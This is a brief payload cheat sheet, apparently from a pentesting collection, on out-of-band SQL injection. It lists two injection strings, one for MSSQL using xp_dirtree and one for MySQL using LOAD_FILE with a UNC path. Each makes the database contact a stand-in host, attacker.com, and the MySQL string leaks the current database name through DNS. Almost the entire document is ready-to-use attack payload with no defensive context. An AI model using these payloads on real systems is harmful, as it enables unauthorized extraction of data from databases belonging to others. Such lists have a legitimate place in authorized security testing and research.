# Out-of-Band SQL Injection

## Summary
Exfiltrate data via DNS/HTTP.

## Payloads
```sql
'; EXEC master.dbo.xp_dirtree '//attacker.com/table'-- - (MSSQL)
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\test'))-- - (MySQL)
```
